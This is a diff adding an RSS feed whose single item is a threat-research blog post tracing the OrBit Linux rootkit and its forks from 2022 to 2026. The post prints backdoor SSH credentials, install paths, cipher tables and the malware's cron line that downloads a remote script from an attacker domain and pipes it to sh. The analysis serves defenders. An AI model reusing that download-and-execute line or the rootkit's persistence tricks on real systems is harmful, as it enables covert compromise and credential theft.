@@ -1,0 +1,148 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Intezer Research – Home</title>
+    <link>/</link>
+    <description>Recent content in Home on Intezer Research</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 22 Apr 2026 00:00:00 +0000</lastBuildDate>
+    
+	  <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+      
+    
+    
+    <item>
+      <title>OrBit (Re)turns: Tracking an Open-Source Linux Rootkit Across Four Years of Forks and Deployments</title>
+      <link>/blog/reorbit/</link>
+      <pubDate>Wed, 22 Apr 2026 00:00:00 +0000</pubDate>
+      
+      <guid>/blog/reorbit/</guid>
+      <description>
+        
+        
+        &lt;h2&gt;Introduction&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In July 2022, we &lt;a href=&#34;https://intezer.com/blog/orbit-new-undetected-linux-threat/&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;published the first analysis&lt;/a&gt; of OrBit, a then-undocumented Linux userland-rootkit that stood out for its comprehensive libc hooking, SSH backdoor access, and PAM-based credential harvesting. At the time, OrBit appeared as a single sample with a single operator fingerprint, and the codebase itself looked customized.&lt;/p&gt;
+&lt;p&gt;It wasn&amp;rsquo;t. As we will show below, OrBit is a repackaged and selectively weaponized build of &lt;a href=&#34;https://github.com/ldpreload/Medusa&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Medusa&lt;/a&gt;, an open-source LD_PRELOAD rootkit published on GitHub in December 2022. The story of OrBit&amp;rsquo;s four-year evolution is not one of novel development; it&amp;rsquo;s the story of how a publicly available rootkit was forked, configured, and redeployed.&lt;/p&gt;
+&lt;p&gt;Nearly four years later, OrBit is still in the wild, and it has not stood still. Hunting across VirusTotal, we pulled more than a dozen samples spanning 2022 through 2026 and walked each one through static and differential analysis. What we discovered is not a single evolving binary but two parallel lineages: a full-featured &amp;ldquo;Lineage A&amp;rdquo; build that tracks closely with the 2022 original, and a lite &amp;ldquo;Lineage B&amp;rdquo; fork that drops entire capability domains (PAM, pcap, TCP-port hiding) in exchange for a smaller footprint. Along the way, the operators rotate XOR keys, shuffle install paths, swap backdoor credentials, add auditd-evasion hooks, and eventually bolt on a service-side PAM impersonation primitive.&lt;/p&gt;
+&lt;p&gt;This blog picks up where the 2022 analysis left off. We focus on what changed, when, and why it matters for defenders. For each epoch, we enumerate the samples, call out the lineage, and break down the meaningful changes: credential changes, hook-set diffs, new evasion behavior, and operator tradecraft.&lt;/p&gt;
+&lt;h2&gt;Background: What is OrBit?&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;background-what-is-orbit&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#background-what-is-orbit&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;For readers unfamiliar with the original analysis, OrBit is a Linux userland-rootkit deployed as a shared library (.so) that achieves persistence by patching the dynamic linker, specifically modifying ld.so to ensure the malicious library is loaded into every process on the system. It operates as a passive implant with no command-and-control communication; instead, the attacker connects in through an SSH backdoor. Once installed, OrBit hooks into PAM functions to harvest credentials from SSH and sudo authentication attempts, storing the captured passwords locally.&lt;/p&gt;
+&lt;p&gt;Its evasion capabilities are comprehensive, hooking over forty libc functions to hide files, processes, and network connections from administrators and security tools alike. The malware stores its harvested credentials and configuration data in &lt;code&gt;/lib/libntpVnQE6mk/&lt;/code&gt;, a directory that remains invisible to standard enumeration thanks to the rootkit&amp;rsquo;s own hooks.&lt;/p&gt;
+&lt;h3&gt;July 2002&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;july-2002&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#july-2002&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Hash&lt;/th&gt;
+          &lt;th&gt;XOR&lt;/th&gt;
+          &lt;th&gt;Working dir&lt;/th&gt;
+          &lt;th&gt;SSH Username&lt;/th&gt;
+          &lt;th&gt;SSH Password&lt;/th&gt;
+          &lt;th&gt;# Exports&lt;/th&gt;
+          &lt;th&gt;# Hooks&lt;/th&gt;
+          &lt;th&gt;Dropper&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;40b5127c&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;0xA2&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;/lib/libntpVnQE6mk/&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;2l8&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;c4ss0ul3tt3&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;66&lt;/td&gt;
+          &lt;td&gt;54&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;f1612924&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;We will refer to this variant as Lineage A &amp;ldquo;Full&amp;rdquo; build of OrBit.&lt;/p&gt;
+&lt;h2&gt;OrBit Variants Through The Years&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;orbit-variants-through-the-years&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#orbit-variants-through-the-years&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In our research, we collected samples from VirusTotal. Unlike PE files, ELF files don’t include a compilation timestamp, so we started by aggregating the samples by the date they were submitted to VirusTotal. To track the samples on the blog, we use the first 8 characters of each sample&amp;rsquo;s SHA-256. At the bottom of the blog, you can find the full list of IOCs.&lt;/p&gt;
+&lt;h3&gt;December 2022&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;december-2022&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#december-2022&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The first version shows a slight change: the username and password for the SSH connection, and the exported functions. Credential mechanism shift: &lt;code&gt;40b5127c&lt;/code&gt; resolved the backdoor username dynamically via the getpwuid hook; &lt;code&gt;ec7462c3&lt;/code&gt; dropped that hook entirely and hardcodes &lt;code&gt;adm1n&lt;/code&gt; directly in the XOR-encrypted string table. The working folder was changed to &lt;strong&gt;libseconf&lt;/strong&gt;. For the most part, the later variants will use this path.&lt;/p&gt;
+&lt;p&gt;All other capabilities are identical: file I/O interception, stat hiding, PAM credential capture, TCP port hiding (alloc_tcp_ports/remove_port/tcp_port_hidden), load monitoring (.showload/.maxload), pcap sniffing, LD_PRELOAD management, log suppression, and process hiding.&lt;/p&gt;
+&lt;p&gt;The transition from 2022 to 2023 is essentially a redeployment with new credentials and a more convincing install path, plus a minor simplification (dropping dynamic UID lookup in favor of a hardcoded username).&lt;/p&gt;
+&lt;p&gt;The rootkit&amp;rsquo;s hook surface stayed stable.&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Hash&lt;/th&gt;
+          &lt;th&gt;XOR&lt;/th&gt;
+          &lt;th&gt;Working dir&lt;/th&gt;
+          &lt;th&gt;SSH Username&lt;/th&gt;
+          &lt;th&gt;SSH Password&lt;/th&gt;
+          &lt;th&gt;# Exports&lt;/th&gt;
+          &lt;th&gt;# Hooks&lt;/th&gt;
+          &lt;th&gt;Dropper&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;ec7462c3&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;0xA2&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;/lib/libseconf/&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;adm1n&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;asdfasdf&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;67&lt;/td&gt;
+          &lt;td&gt;53&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;8ea420d9&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&amp;ndash;snip&amp;ndash;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Samples From 2025&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;samples-from-2025&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#samples-from-2025&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Dropper Samples&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;dropper-samples&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#dropper-samples&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;code&gt;090b15fd&lt;/code&gt;, &lt;code&gt;64a3ebd3&lt;/code&gt;, and &lt;code&gt;b85ed157&lt;/code&gt; are statically linked ELF executables that carry &lt;code&gt;8e83cbb2&lt;/code&gt; as an embedded .so and share the same &lt;code&gt;Build ID: da256c78910c552eb334814ada85c7655b717c4f&lt;/code&gt;. &lt;code&gt;d3d204c1&lt;/code&gt; is the same type of dropper carrying &lt;code&gt;2b2eeb22&lt;/code&gt;. All four share the same architecture first seen in &lt;code&gt;f1612924&lt;/code&gt; (from 2022).&lt;/p&gt;
+&lt;h5&gt;73b95b7d: A New Dropper Architecture&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;73b95b7d-a-new-dropper-architecture&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#73b95b7d-a-new-dropper-architecture&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;p&gt;&lt;code&gt;73b95b7d&lt;/code&gt; is not just a dropper, it is an infector that carries the dropper as an embedded payload. This creates a two-stage delivery chain: infector → dropper → rootkit.&lt;/p&gt;
+&lt;p&gt;The inner binary (&lt;code&gt;090b15fd&lt;/code&gt;, embedded at file offset &lt;code&gt;0x20d7&lt;/code&gt;) is the dropper we previously saw. The infector&amp;rsquo;s role is propagation and persistence; the dropper&amp;rsquo;s role is to extract and install the rootkit &lt;code&gt;.so&lt;/code&gt; via &lt;code&gt;ld.so.preload&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The infector scans the filesystem for ELF binaries and injects the second-stage payload into them. An infection marker &lt;code&gt;bongripz4jezuz&lt;/code&gt; (stored in base64 encoding as: &lt;code&gt;Ym9uZ3JpcHo0amV6dXoK&lt;/code&gt;) is checked before each infection attempt to avoid re-infecting the same target. The injected binaries include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/bin/ls&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;All 64-bit ELF files in the current working directory that have read/write access.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Additionally, &lt;code&gt;/etc/cron.hourly/0&lt;/code&gt; is created as a persistence mechanism (to download and execute a remote payload), though it is a shell script rather than an ELF injection target.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;wget --quiet http://cf0&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;pw/0/etc/cron.hourly/0 -O- 2&amp;gt;/dev/null&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;sh&amp;gt;/dev/null 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;This is the first OrBit component with any form of C2 communication. Every previous version was a purely passive implant, meaning the attacker connected via the SSH backdoor.&lt;/p&gt;
+&lt;p&gt;This introduces an external command channel that can deliver updated payloads or instructions, adding a reinfection mechanism on top of &lt;code&gt;ld.so.preload&lt;/code&gt; persistence.&lt;/p&gt;
+&lt;p&gt;The earlier droppers stored all paths and commands as plaintext. &lt;code&gt;73b95b7d&lt;/code&gt; is the first dropper to implement string protection: a custom substitution cipher using two lookup tables at &lt;code&gt;.data&lt;/code&gt; offsets for the cipher and plain, each with 88 entries, defining a character-by-character mapping. Notably, this is a different scheme from the XOR encryption used by the previous rootkit payloads.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mw_plain_table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&amp;amp;*&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;\&amp;#34;\n\r&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mw_cipher_table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x58&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;lt;&amp;gt;@o$:,.l+*^?=)(|AB&amp;amp;%;D!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;Connection to RHOMBUS&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;connection-to-rhombus&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#connection-to-rhombus&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;
+      </description>
+    </item>
+    
+  </channel>
+</rss>
